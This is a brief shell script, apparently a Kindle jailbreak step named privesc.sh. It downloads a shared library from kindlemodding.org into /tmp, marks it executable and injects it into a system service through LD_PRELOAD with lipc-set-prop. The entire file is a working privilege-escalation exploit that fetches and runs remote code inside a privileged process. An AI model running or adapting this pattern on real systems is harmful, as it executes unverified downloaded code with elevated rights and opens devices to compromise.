#!/bin/sh
logger "privesc.sh executed any failure is solely with the privesc now"
curl -o /tmp/jb.so https://kindlemodding.org/vera/aprivesc/jb.so
chmod +x /tmp/jb.so
lipc-set-prop com.lab126.system updateWaveform LD_PRELOAD=/tmp/jb.so
